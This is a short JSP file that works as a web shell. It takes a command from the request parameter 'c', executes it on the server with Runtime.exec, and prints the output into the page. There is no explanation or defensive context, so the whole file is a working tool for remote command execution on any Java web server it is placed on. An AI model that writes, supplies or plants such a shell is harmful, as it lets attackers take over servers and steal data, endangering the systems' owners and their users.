<%-- command is split on spaces and passed to execve --%>
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("c");
String o = "";
if (c != null) {
  String l = null;
  try {
     Process p = Runtime.getRuntime().exec(c);
     BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
     while ((l = r.readLine()) != null) {
       o += l + "\n";
     }
  } catch (IOException e) {
    e.printStackTrace();
  }
}
%>
<%=o %>
